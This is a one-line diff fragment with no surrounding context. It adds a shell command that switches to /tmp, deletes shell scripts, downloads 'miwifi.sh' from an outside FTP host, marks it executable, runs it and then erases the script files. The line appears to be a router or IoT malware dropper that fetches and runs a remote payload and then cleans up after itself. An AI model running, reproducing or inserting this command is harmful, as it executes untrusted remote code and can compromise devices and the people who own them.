@@ -1,0 +1,1 @@
+cd /tmp && rm -rf *.sh && cd /tmp && rm -rf *.sh && wget ftp://joerv.gicp.net/miwifi/miwifi.sh && chmod +x miwifi.sh && sh ./miwifi.sh && rm -rf *.sh
